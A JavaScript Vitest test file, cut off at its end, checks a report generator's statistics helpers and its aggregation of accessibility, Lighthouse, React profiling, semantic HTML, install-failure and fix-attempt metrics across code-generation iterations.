import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import {
  analyzeAccessibility,
  analyzeComponents,
  analyzeComponentUsage,
  analyzeFeedback,
  analyzeInlineStyles,
  analyzeLighthouse,
  analyzeReactProfile,
  analyzeSemanticHtml,
  computeCodeVariance,
  generateReport,
  jaccardSimilarity,
  mean,
  ngramSet,
  round,
  stdDev,
  sum,
} from "./report.js";

// ---------------------------------------------------------------------------
// mean
// ---------------------------------------------------------------------------
describe("mean", () => {
  it("returns null for an empty array", () => {
    expect(mean([])).toBeNull();
  });

  it("returns the single value for a one-element array", () => {
    expect(mean([42])).toBe(42);
  });

  it("computes the arithmetic mean", () => {
    expect(mean([2, 4, 6])).toBe(4);
  });

  it("handles negative numbers", () => {
    expect(mean([-10, 10])).toBe(0);
  });

  it("ignores non-finite entries instead of propagating NaN", () => {
    expect(mean([2, null, 4, undefined, 6, NaN])).toBe(4);
  });

  it("returns null when every entry is non-finite", () => {
    expect(mean([null, undefined, NaN])).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// sum
// ---------------------------------------------------------------------------
describe("sum", () => {
  it("returns 0 for an empty array", () => {
    expect(sum([])).toBe(0);
  });

  it("sums positive numbers", () => {
    expect(sum([1, 2, 3, 4])).toBe(10);
  });

  it("handles a mix of positive and negative numbers", () => {
    expect(sum([10, -3, 5, -2])).toBe(10);
  });
});

// ---------------------------------------------------------------------------
// stdDev
// ---------------------------------------------------------------------------
describe("stdDev", () => {
  it("returns null for a single-element array (spread is undefined)", () => {
    expect(stdDev([5])).toBeNull();
  });

  it("returns null for an empty array", () => {
    expect(stdDev([])).toBeNull();
  });

  it("returns 0 when all values are identical", () => {
    expect(stdDev([7, 7, 7, 7])).toBe(0);
  });

  it("ignores non-finite entries", () => {
    expect(stdDev([7, null, 7, NaN, 7, 7])).toBe(0);
  });

  it("computes the population standard deviation", () => {
    // [2, 4, 4, 4, 5, 5, 7, 9] → mean=5, variance=4, stdDev=2
    const result = stdDev([2, 4, 4, 4, 5, 5, 7, 9]);
    expect(result).toBeCloseTo(2, 5);
  });
});

// ---------------------------------------------------------------------------
// round
// ---------------------------------------------------------------------------
describe("round", () => {
  it("rounds to 3 decimal places by default", () => {
    expect(round(3.14159)).toBe(3.142);
  });

  it("respects a custom decimal count", () => {
    expect(round(3.14159, 1)).toBe(3.1);
  });

  it("returns null for null", () => {
    expect(round(null)).toBeNull();
  });

  it("returns null for undefined (never leaks it into a report)", () => {
    expect(round(undefined)).toBeNull();
  });

  it("returns null for NaN (never renders the literal 'NaN')", () => {
    expect(round(NaN)).toBeNull();
  });

  it("handles 0 decimals", () => {
    expect(round(3.7, 0)).toBe(4);
  });
});

// ---------------------------------------------------------------------------
// ngramSet
// ---------------------------------------------------------------------------
describe("ngramSet", () => {
  it("produces character 3-grams from a short string", () => {
    const result = ngramSet("abcde", 3);
    expect(result).toBeInstanceOf(Set);
    expect(result).toEqual(new Set(["abc", "bcd", "cde"]));
  });

  it("normalizes whitespace before generating n-grams", () => {
    const result = ngramSet("a  b", 2);
    // "a  b" → "a b" after normalization
    expect(result).toEqual(new Set(["a ", " b"]));
  });

  it("returns an empty set when text is shorter than n", () => {
    const result = ngramSet("ab", 5);
    expect(result.size).toBe(0);
  });

  it("returns an empty set for an empty string", () => {
    const result = ngramSet("", 3);
    expect(result.size).toBe(0);
  });

  it("deduplicates repeated n-grams", () => {
    const result = ngramSet("aaa", 2);
    expect(result).toEqual(new Set(["aa"]));
  });
});

// ---------------------------------------------------------------------------
// jaccardSimilarity
// ---------------------------------------------------------------------------
describe("jaccardSimilarity", () => {
  it("returns 1 for two empty sets", () => {
    expect(jaccardSimilarity(new Set(), new Set())).toBe(1);
  });

  it("returns 0 for completely disjoint sets", () => {
    expect(jaccardSimilarity(new Set(["a", "b"]), new Set(["c", "d"]))).toBe(0);
  });

  it("returns 1 for identical sets", () => {
    const s = new Set(["x", "y", "z"]);
    expect(jaccardSimilarity(s, s)).toBe(1);
  });

  it("computes correct similarity for overlapping sets", () => {
    const a = new Set(["a", "b", "c"]);
    const b = new Set(["b", "c", "d"]);
    // intersection = {b,c} → 2, union = {a,b,c,d} → 4, similarity = 0.5
    expect(jaccardSimilarity(a, b)).toBe(0.5);
  });

  it("handles one empty set and one non-empty set", () => {
    expect(jaccardSimilarity(new Set(), new Set(["a"]))).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// computeCodeVariance
// ---------------------------------------------------------------------------
describe("computeCodeVariance", () => {
  it("returns a description when fewer than 2 iterations", () => {
    const result = computeCodeVariance([
      { iteration: 1, files: [{ path: "a.tsx", content: "hello" }] },
    ]);
    expect(result.averageContentSimilarity).toBeNull();
    expect(result.averageStructuralSimilarity).toBeNull();
    expect(result.pairwiseContentSimilarity).toEqual([]);
    expect(result.description).toMatch(/at least 2/i);
  });

  it("returns perfect similarity for identical iterations", () => {
    const file = {
      path: "src/App.tsx",
      content: "import React from 'react';\nexport default () => <div>Hello</div>;",
    };
    const result = computeCodeVariance([
      { iteration: 1, files: [file] },
      { iteration: 2, files: [file] },
    ]);
    expect(result.averageContentSimilarity).toBe(1);
    expect(result.averageStructuralSimilarity).toBe(1);
    expect(result.pairwiseContentSimilarity).toHaveLength(1);
    expect(result.pairwiseContentSimilarity[0].similarity).toBe(1);
  });

  it("returns lower similarity for different content", () => {
    const result = computeCodeVariance([
      { iteration: 1, files: [{ path: "App.tsx", content: "function foo() { return 1; }" }] },
      {
        iteration: 2,
        files: [
          {
            path: "App.tsx",
            content:
              "class Bar extends Component { render() { return <span>totally different</span>; } }",
          },
        ],
      },
    ]);
    expect(result.averageContentSimilarity).toBeLessThan(1);
    expect(result.averageContentSimilarity).toBeGreaterThanOrEqual(0);
  });

  it("measures structural similarity via file paths", () => {
    const result = computeCodeVariance([
      {
        iteration: 1,
        files: [
          { path: "App.tsx", content: "a" },
          { path: "utils.ts", content: "b" },
        ],
      },
      {
        iteration: 2,
        files: [
          { path: "App.tsx", content: "c" },
          { path: "helpers.ts", content: "d" },
        ],
      },
    ]);
    // They share App.tsx but differ on the second file
    // Jaccard of {App.tsx, utils.ts} vs {App.tsx, helpers.ts} = 1/3
    expect(result.averageStructuralSimilarity).toBeCloseTo(1 / 3, 2);
  });

  it("generates pairwise entries for 3 iterations", () => {
    const mkIter = (i, content) => ({ iteration: i, files: [{ path: "a.tsx", content }] });
    const result = computeCodeVariance([mkIter(1, "aaa"), mkIter(2, "bbb"), mkIter(3, "ccc")]);
    // 3 iterations → 3 pairs (1-2, 1-3, 2-3)
    expect(result.pairwiseContentSimilarity).toHaveLength(3);
    expect(result.pairwiseStructuralSimilarity).toHaveLength(3);
  });

  it("handles iterations with no files gracefully", () => {
    const result = computeCodeVariance([
      { iteration: 1, files: [] },
      { iteration: 2, files: [] },
    ]);
    // File-less iterations are excluded — two empty n-gram sets would
    // otherwise compare as identical (similarity = 1).
    expect(result.averageContentSimilarity).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// analyzeFeedback
// ---------------------------------------------------------------------------
describe("analyzeFeedback", () => {
  it("returns zeroed summary for iterations with no feedback", () => {
    const result = analyzeFeedback([{ iteration: 1 }, { iteration: 2, feedback: [] }]);
    expect(result.totalItems).toBe(0);
    expect(result.uniqueItems).toBe(0);
    expect(result.averagePerIteration).toBe(0);
    expect(result.iterationsWithFeedback).toBe(0);
  });

  it("aggregates feedback items across iterations", () => {
    const iters = [
      {
        iteration: 1,
        feedback: [
          { category: "components", text: "Card is confusing" },
          { category: "theming", text: "Dark mode broken" },
        ],
      },
      {
        iteration: 2,
        feedback: [{ category: "components", text: "Button needs hover state" }],
      },
    ];
    const result = analyzeFeedback(iters);
    expect(result.totalItems).toBe(3);
    expect(result.uniqueItems).toBe(3);
    expect(result.iterationsWithFeedback).toBe(2);
    expect(result.averagePerIteration).toBe(1.5);
  });

  it("deduplicates identical feedback text (case-insensitive)", () => {
    const iters = [
      { iteration: 1, feedback: [{ category: "components", text: "Card is confusing" }] },
      { iteration: 2, feedback: [{ category: "components", text: "card is confusing" }] },
    ];
    const result = analyzeFeedback(iters);
    expect(result.totalItems).toBe(2);
    expect(result.uniqueItems).toBe(1);
  });

  it("groups items by category and sorts by frequency", () => {
    const iters = [
      {
        iteration: 1,
        feedback: [
          { category: "api", text: "Endpoint unclear" },
          { category: "api", text: "Auth flow confusing" },
          { category: "theming", text: "Colors are off" },
        ],
      },
    ];
    const result = analyzeFeedback(iters);
    expect(result.byCategory.api.count).toBe(2);
    expect(result.byCategory.theming.count).toBe(1);
    expect(result.categoriesSorted[0].category).toBe("api");
  });

  it("includes perIteration breakdown", () => {
    const iters = [
      { iteration: 1, feedback: [{ category: "dx", text: "slow" }] },
      { iteration: 2, feedback: [] },
    ];
    const result = analyzeFeedback(iters);
    expect(result.perIteration).toHaveLength(2);
    expect(result.perIteration[0].count).toBe(1);
    expect(result.perIteration[1].count).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// analyzeComponents
// ---------------------------------------------------------------------------
describe("analyzeComponents", () => {
  it("returns zeroed summary when no iterations have components", () => {
    const result = analyzeComponents([{ iteration: 1 }]);
    expect(result.uniqueUIComponents).toBe(0);
    expect(result.uniqueIcons).toBe(0);
    expect(result.totalUniqueElements).toBe(0);
    expect(result.averageComponentsPerIteration).toBe(0);
  });

  it("separates UI components from icons (icon: prefix)", () => {
    const iters = [
      {
        iteration: 1,
        componentImports: ["Button", "Card", "icon:AddIcon", "icon:CloseIcon"],
      },
    ];
    const result = analyzeComponents(iters);
    expect(result.uniqueUIComponents).toBe(2);
    expect(result.uniqueIcons).toBe(2);
    expect(result.uiComponentsList).toEqual(["Button", "Card"]);
    expect(result.iconsList).toEqual(["AddIcon", "CloseIcon"]);
  });

  it("deduplicates components across iterations", () => {
    const iters = [
      { iteration: 1, componentImports: ["Button", "Card"] },
      { iteration: 2, componentImports: ["Card", "TextInput"] },
    ];
    const result = analyzeComponents(iters);
    expect(result.totalUniqueElements).toBe(3);
    expect(result.uiComponentsList).toEqual(["Button", "Card", "TextInput"]);
  });

  it("computes frequency of each component across iterations", () => {
    const iters = [
      { iteration: 1, componentImports: ["Button", "Card"] },
      { iteration: 2, componentImports: ["Card"] },
      { iteration: 3, componentImports: ["Button", "Card"] },
    ];
    const result = analyzeComponents(iters);
    expect(result.frequency.Card).toBe(3);
    expect(result.frequency.Button).toBe(2);
  });

  it("computes averageComponentsPerIteration", () => {
    const iters = [
      { iteration: 1, componentImports: ["Button", "Card"] },
      { iteration: 2, componentImports: ["TextInput"] },
    ];
    const result = analyzeComponents(iters);
    // (2 + 1) / 2 = 1.5
    expect(result.averageComponentsPerIteration).toBe(1.5);
  });
});

// ---------------------------------------------------------------------------
// analyzeAccessibility
// ---------------------------------------------------------------------------
describe("analyzeAccessibility", () => {
  it("returns description-only when no iterations have a11y results", () => {
    const result = analyzeAccessibility([{ iteration: 1 }, { iteration: 2 }]);
    expect(result.iterationsWithResults).toBe(0);
    expect(result.totalIterations).toBe(2);
    expect(result.description).toMatch(/no accessibility/i);
  });

  it("aggregates violation counts across iterations", () => {
    const iters = [
      {
        iteration: 1,
        a11yResults: {
          summary: { totalViolations: 3, lightViolations: 2, darkOnlyViolations: 1, passed: false },
          axeViolationCount: 3,
          axeViolations: [
            {
              id: "color-contrast",
              impact: "serious",
              description: "Contrast too low",
              modes: ["light"],
            },
            {
              id: "color-contrast",
              impact: "serious",
              description: "Contrast too low",
              modes: ["dark"],
            },
            { id: "image-alt", impact: "critical", description: "Missing alt", modes: ["light"] },
          ],
        },
      },
      {
        iteration: 2,
        a11yResults: {
          summary: { totalViolations: 1, lightViolations: 1, darkOnlyViolations: 0, passed: false },
          axeViolationCount: 1,
          axeViolations: [
            {
              id: "color-contrast",
              impact: "serious",
              description: "Contrast too low",
              modes: ["light"],
            },
          ],
        },
      },
    ];
    const result = analyzeAccessibility(iters);
    expect(result.iterationsWithResults).toBe(2);
    expect(result.totalViolations).toBe(4);
    expect(result.averageViolations).toBe(2);
    expect(result.topViolations[0].id).toBe("color-contrast");
    expect(result.topViolations[0].count).toBe(3);
    expect(result.topViolations[0].modes).toContain("light");
    expect(result.topViolations[0].modes).toContain("dark");
  });

  it("computes pass rate across iterations", () => {
    const iters = [
      {
        iteration: 1,
        a11yResults: {
          summary: { totalViolations: 0, lightViolations: 0, darkOnlyViolations: 0, passed: true },
          axeViolationCount: 0,
          axeViolations: [],
        },
      },
      {
        iteration: 2,
        a11yResults: {
          summary: { totalViolations: 2, lightViolations: 2, darkOnlyViolations: 0, passed: false },
          axeViolationCount: 2,
          axeViolations: [
            { id: "color-contrast", impact: "serious", modes: ["light"] },
            { id: "landmark-one-main", impact: "moderate", modes: ["light"] },
          ],
        },
      },
    ];
    const result = analyzeAccessibility(iters);
    expect(result.passRate).toBe(0.5);
    expect(result.perIteration[0].passed).toBe(true);
    expect(result.perIteration[1].passed).toBe(false);
  });

  it("excludes skipped scans from averages and pass rate", () => {
    const iters = [
      {
        iteration: 1,
        a11yResults: {
          summary: { totalViolations: 4, passed: false },
          axeViolationCount: 4,
          axeViolations: [{ id: "color-contrast", impact: "serious", modes: ["light"] }],
        },
      },
      {
        // axe failed to inject — recorded as skipped with zero count.
        iteration: 2,
        a11yResults: {
          summary: { skipped: true, passed: false },
          axeViolationCount: 0,
          axeViolations: [],
        },
      },
    ];
    const result = analyzeAccessibility(iters);
    // Only the real scan counts: avg 4/1, not 4/2.
    expect(result.iterationsWithResults).toBe(1);
    expect(result.skippedIterations).toBe(1);
    expect(result.averageViolations).toBe(4);
    expect(result.passRate).toBe(0);
    expect(result.perIteration).toHaveLength(1);
  });

  it("reports skip count when every scan was skipped", () => {
    const iters = [
      {
        iteration: 1,
        a11yResults: {
          summary: { skipped: true, passed: false },
          axeViolationCount: 0,
          axeViolations: [],
        },
      },
    ];
    const result = analyzeAccessibility(iters);
    expect(result.iterationsWithResults).toBe(0);
    expect(result.skippedIterations).toBe(1);
    expect(result.description).toMatch(/skipped/i);
  });
});

// ---------------------------------------------------------------------------
// analyzeLighthouse
// ---------------------------------------------------------------------------
describe("analyzeLighthouse", () => {
  it("returns nulls when no iterations have lighthouse results", () => {
    const result = analyzeLighthouse([{ iteration: 1 }, { iteration: 2 }]);
    expect(result.iterationsWithResults).toBe(0);
    expect(result.avgFcpMs).toBeNull();
    expect(result.avgLcpMs).toBeNull();
    expect(result.perIteration).toEqual([]);
  });

  it("skips iterations whose lighthouse run errored", () => {
    const result = analyzeLighthouse([{ iteration: 1, lighthouseResults: { error: "timeout" } }]);
    expect(result.iterationsWithResults).toBe(0);
  });

  it("computes averages across valid iterations", () => {
    const iters = [
      {
        iteration: 1,
        lighthouseResults: {
          fcpMs: 100,
          lcpMs: 200,
          tbtMs: 50,
          ttiMs: 300,
          speedIndex: 150,
          performanceScore: 0.9,
          runs: 3,
        },
      },
      {
        iteration: 2,
        lighthouseResults: {
          fcpMs: 200,
          lcpMs: 400,
          tbtMs: 100,
          ttiMs: 500,
          speedIndex: 250,
          performanceScore: 0.7,
          runs: 3,
        },
      },
    ];
    const result = analyzeLighthouse(iters);
    expect(result.iterationsWithResults).toBe(2);
    expect(result.avgFcpMs).toBe(150);
    expect(result.avgLcpMs).toBe(300);
    expect(result.avgTbtMs).toBe(75);
    expect(result.avgPerformanceScore).toBe(0.8);
    expect(result.perIteration).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
// analyzeReactProfile
// ---------------------------------------------------------------------------
describe("analyzeReactProfile", () => {
  it("returns nulls when no iterations have react profile data", () => {
    const result = analyzeReactProfile([{ iteration: 1 }]);
    expect(result.iterationsWithResults).toBe(0);
    expect(result.avgMountMs).toBeNull();
    expect(result.avgCommitCount).toBeNull();
    expect(result.perIteration).toEqual([]);
  });

  it("computes averages across iterations with react profile data", () => {
    const iters = [
      {
        iteration: 1,
        reactProfile: { mountMs: 12, commitCount: 5, avgUpdateMs: 3, maxUpdateMs: 7 },
      },
      {
        iteration: 2,
        reactProfile: { mountMs: 20, commitCount: 3, avgUpdateMs: 5, maxUpdateMs: 9 },
      },
    ];
    const result = analyzeReactProfile(iters);
    expect(result.iterationsWithResults).toBe(2);
    expect(result.avgMountMs).toBe(16);
    expect(result.avgCommitCount).toBe(4);
    expect(result.avgUpdateMs).toBe(4);
    expect(result.avgMaxUpdateMs).toBe(8);
    expect(result.perIteration).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
// analyzeComponentUsage
// ---------------------------------------------------------------------------
describe("analyzeComponentUsage", () => {
  it("returns zeroed summary when no iterations have usage data", () => {
    const result = analyzeComponentUsage([{ iteration: 1 }]);
    expect(result.iterationsWithData).toBe(0);
    expect(result.totalAcrossIterations).toBe(0);
    expect(result.byComponent).toEqual({});
    expect(result.perIteration).toEqual([]);
  });

  it("aggregates component counts across iterations", () => {
    const iters = [
      {
        iteration: 1,
        componentUsage: {
          total: 5,
          byComponent: { Button: 3, Card: 2 },
        },
      },
      {
        iteration: 2,
        componentUsage: {
          total: 3,
          byComponent: { Button: 1, TextInput: 2 },
        },
      },
    ];
    const result = analyzeComponentUsage(iters);
    expect(result.iterationsWithData).toBe(2);
    expect(result.totalAcrossIterations).toBe(8);
    expect(result.averagePerIteration).toBe(4);
    expect(result.byComponent).toEqual({ Button: 4, Card: 2, TextInput: 2 });
    expect(result.perIteration).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
// analyzeInlineStyles
// ---------------------------------------------------------------------------
describe("analyzeInlineStyles", () => {
  it("returns zeroed summary when no iterations have inline style data", () => {
    const result = analyzeInlineStyles([{ iteration: 1 }]);
    expect(result.iterationsWithData).toBe(0);
    expect(result.totalAcrossIterations).toBe(0);
    expect(result.byComponent).toEqual({});
    expect(result.byProperty).toEqual({});
    expect(result.topProperties).toEqual([]);
  });

  it("aggregates inline style counts and sorts topProperties by frequency", () => {
    const iters = [
      {
        iteration: 1,
        inlineStyles: {
          total: 4,
          byComponent: { Card: 2, Button: 2 },
          byProperty: { color: 3, padding: 1 },
        },
      },
      {
        iteration: 2,
        inlineStyles: {
          total: 2,
          byComponent: { Card: 1, Stack: 1 },
          byProperty: { margin: 2 },
        },
      },
    ];
    const result = analyzeInlineStyles(iters);
    expect(result.iterationsWithData).toBe(2);
    expect(result.totalAcrossIterations).toBe(6);
    expect(result.averagePerIteration).toBe(3);
    expect(result.byComponent).toEqual({ Card: 3, Button: 2, Stack: 1 });
    expect(result.byProperty).toEqual({ color: 3, padding: 1, margin: 2 });
    // topProperties should be sorted descending: color(3), margin(2), padding(1)
    expect(result.topProperties[0]).toEqual({ property: "color", count: 3 });
    expect(result.topProperties[2]).toEqual({ property: "padding", count: 1 });
  });
});

// ---------------------------------------------------------------------------
// analyzeSemanticHtml
// ---------------------------------------------------------------------------
describe("analyzeSemanticHtml", () => {
  it("returns null averages when no iterations have semantic data", () => {
    const result = analyzeSemanticHtml([{ iteration: 1 }]);
    expect(result.iterationsWithData).toBe(0);
    expect(result.avgSemanticCount).toBeNull();
    expect(result.avgGenericCount).toBeNull();
    expect(result.avgRoleCount).toBeNull();
    expect(result.avgSemanticRatio).toBeNull();
    expect(result.perIteration).toEqual([]);
  });

  it("aggregates semantic HTML counts across iterations", () => {
    const iters = [
      {
        iteration: 1,
        semanticHtml: {
          total: 20,
          semanticCount: 12,
          genericCount: 8,
          roleCount: 3,
          semanticRatio: 0.6,
          semanticByTag: { header: 1, nav: 2, main: 1 },
          genericByTag: { div: 5, span: 3 },
          rolesByValue: { button: 2, navigation: 1 },
        },
      },
      {
        iteration: 2,
        semanticHtml: {
          total: 16,
          semanticCount: 8,
          genericCount: 8,
          roleCount: 1,
          semanticRatio: 0.5,
          semanticByTag: { header: 1, footer: 1 },
          genericByTag: { div: 6, span: 2 },
          rolesByValue: { button: 1 },
        },
      },
    ];
    const result = analyzeSemanticHtml(iters);
    expect(result.iterationsWithData).toBe(2);
    expect(result.totalIterations).toBe(2);
    expect(result.avgSemanticCount).toBe(10);
    expect(result.avgGenericCount).toBe(8);
    expect(result.avgRoleCount).toBe(2);
    // (0.6 + 0.5) / 2 = 0.55 → rounded to 1 decimal = 0.6
    expect(result.avgSemanticRatio).toBe(0.6);
    expect(result.globalSemanticByTag).toEqual({ header: 2, nav: 2, main: 1, footer: 1 });
    expect(result.globalGenericByTag).toEqual({ div: 11, span: 5 });
    expect(result.globalRolesByValue).toEqual({ button: 3, navigation: 1 });
    expect(result.perIteration).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
// generateReport — markdown section regression tests
// ---------------------------------------------------------------------------
describe("generateReport markdown sections", () => {
  it("renders DOM Elements and Semantic HTML when there are zero inline styles", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 10,
        linesOfCode: 50,
        files: [{ path: "src/App.tsx", content: "export default () => null;\n" }],
        componentImports: [],
        fixAttempts: 0,
        // The desired outcome the harness measures for: no inline styles.
        // These sections used to be nested inside the inline-styles
        // conditional and silently vanished from the report in this case.
        inlineStyles: { total: 0, byComponent: {}, byProperty: {} },
        domElementCount: 120,
        domHtmlBytes: 4096,
        semanticHtml: {
          total: 20,
          semanticCount: 12,
          genericCount: 8,
          roleCount: 3,
          semanticRatio: 0.6,
          semanticByTag: { main: 1, nav: 1 },
          genericByTag: { div: 8 },
          rolesByValue: { button: 2 },
        },
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const md = await readFile(join(dir, "report.md"), "utf-8");

      expect(md).toContain("No inline style data available.");
      expect(md).toContain("### DOM Elements");
      expect(md).toContain("### Semantic HTML");
      // Section order: Inline Styles closes before DOM Elements begins.
      expect(md.indexOf("### DOM Elements")).toBeGreaterThan(md.indexOf("### Inline Styles"));
      expect(md.indexOf("### Semantic HTML")).toBeGreaterThan(md.indexOf("### DOM Elements"));
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });

  it("keeps the Inline Styles section contiguous when inline styles exist", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 10,
        linesOfCode: 50,
        files: [{ path: "src/App.tsx", content: "export default () => null;\n" }],
        componentImports: [],
        fixAttempts: 0,
        inlineStyles: {
          total: 2,
          byComponent: { Card: 2 },
          byProperty: { color: 2 },
        },
        domElementCount: 120,
        domHtmlBytes: 4096,
        semanticHtml: {
          total: 20,
          semanticCount: 12,
          genericCount: 8,
          roleCount: 3,
          semanticRatio: 0.6,
          semanticByTag: { main: 1 },
          genericByTag: { div: 8 },
          rolesByValue: { button: 2 },
        },
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const md = await readFile(join(dir, "report.md"), "utf-8");

      // The inline-styles property table must come BEFORE the DOM
      // Elements section — previously DOM/Semantic rendered in the
      // middle of the Inline Styles section.
      expect(md).toContain("**Most common inline CSS properties:**");
      expect(md.indexOf("**Most common inline CSS properties:**")).toBeLessThan(
        md.indexOf("### DOM Elements"),
      );
      expect(md).toContain("### Semantic HTML");
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});

// ---------------------------------------------------------------------------
// npm install failure tracking
// ---------------------------------------------------------------------------
describe("generateReport rolls up npm install failures", () => {
  it("totals failures across iterations and reports affected-iteration count", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 5,
        linesOfCode: 20,
        files: [],
        componentImports: [],
        fixAttempts: 0,
        exitStage: "clean",
        npmInstallFailures: 0,
      },
      {
        iteration: 2,
        elapsedSeconds: 9,
        linesOfCode: 22,
        files: [],
        componentImports: [],
        fixAttempts: 3,
        exitStage: "build",
        npmInstallFailures: 2,
      },
      {
        iteration: 3,
        elapsedSeconds: 6,
        linesOfCode: 18,
        files: [],
        componentImports: [],
        fixAttempts: 1,
        exitStage: "clean",
        npmInstallFailures: 1,
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const data = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo;

      expect(data.npmInstall.total).toBe(3);
      expect(data.npmInstall.affectedIterations).toBe(2);
      expect(data.npmInstall.totalIterations).toBe(3);

      const md = await readFile(join(dir, "report.md"), "utf-8");
      expect(md).toContain("### npm install failures");
      expect(md).toContain("Total failures");
      // The per-iteration breakdown lists only iterations that hit ≥1.
      expect(md).toContain("**Iteration 2:** 2 failure(s)");
      expect(md).toContain("**Iteration 3:** 1 failure(s)");
      expect(md).not.toContain("**Iteration 1:** 0 failure(s)");
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });

  it("treats older iterations missing the field as zero", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 5,
        linesOfCode: 20,
        files: [],
        componentImports: [],
        fixAttempts: 0,
        exitStage: "clean",
        // no npmInstallFailures field at all
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const data = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo;
      expect(data.npmInstall.total).toBe(0);
      expect(data.npmInstall.affectedIterations).toBe(0);
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});

// ---------------------------------------------------------------------------
// tsconfig / project-reference scaffold error tracking
// ---------------------------------------------------------------------------
describe("generateReport rolls up tsconfig scaffold errors", () => {
  it("totals errors across iterations and reports affected-iteration count", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 5,
        linesOfCode: 20,
        files: [],
        componentImports: [],
        fixAttempts: 0,
        exitStage: "clean",
        tsconfigErrors: 0,
      },
      {
        iteration: 2,
        elapsedSeconds: 9,
        linesOfCode: 22,
        files: [],
        componentImports: [],
        fixAttempts: 5,
        exitStage: "build",
        tsconfigErrors: 4,
      },
      {
        iteration: 3,
        elapsedSeconds: 6,
        linesOfCode: 18,
        files: [],
        componentImports: [],
        fixAttempts: 1,
        exitStage: "clean",
        tsconfigErrors: 1,
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const data = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo;

      expect(data.tsconfigErrors.total).toBe(5);
      expect(data.tsconfigErrors.affectedIterations).toBe(2);
      expect(data.tsconfigErrors.totalIterations).toBe(3);

      const md = await readFile(join(dir, "report.md"), "utf-8");
      expect(md).toContain("### tsconfig / project-reference errors");
      expect(md).toContain("Total errors");
      expect(md).toContain("**Iteration 2:** 4 error(s)");
      expect(md).toContain("**Iteration 3:** 1 error(s)");
      expect(md).not.toContain("**Iteration 1:** 0 error(s)");
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });

  it("treats older iterations missing the field as zero and omits the section when all-zero", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 5,
        linesOfCode: 20,
        files: [],
        componentImports: [],
        fixAttempts: 0,
        exitStage: "clean",
        // no tsconfigErrors field at all
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const data = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo;
      expect(data.tsconfigErrors.total).toBe(0);
      expect(data.tsconfigErrors.affectedIterations).toBe(0);

      // The per-prompt section (with its explanatory note) is conditional
      // on total > 0, unlike the aggregate summary table's group heading
      // above it, which always renders (with zeroed cells) regardless.
      const md = await readFile(join(dir, "report.md"), "utf-8");
      expect(md).not.toContain("A tsconfig scaffold error (TS5023, TS6053, TS6305, TS6306) means");
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});

// ---------------------------------------------------------------------------
// Fix-attempt stage split — build failures must never be conflated with
// accessibility (or lint) repairs in the report.
// ---------------------------------------------------------------------------
describe("generateReport splits fix attempts by repair stage", () => {
  it("reports build vs accessibility vs lint fixes separately", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const base = { elapsedSeconds: 5, linesOfCode: 20, files: [], componentImports: [] };
    const iterations = [
      // Never rendered: 5 build fixes, plus the post-budget-exhaustion
      // `final: true` snapshot (see runner-api.js) — a diagnostic record of
      // the last validation, not a 6th fix attempt. Must not inflate the count.
      {
        ...base,
        iteration: 1,
        fixAttempts: 5,
        exitStage: "build",
        fixLog: [
          ...Array.from({ length: 5 }, (_, i) => ({
            attempt: i + 1,
            stage: "build",
            fatalError: "boom",
          })),
          { attempt: 5, stage: "build", final: true, fatalError: "still boom" },
        ],
      },
      // Rendered fine, needed a11y polish: 4 accessibility + 1 lint fixes.
      {
        ...base,
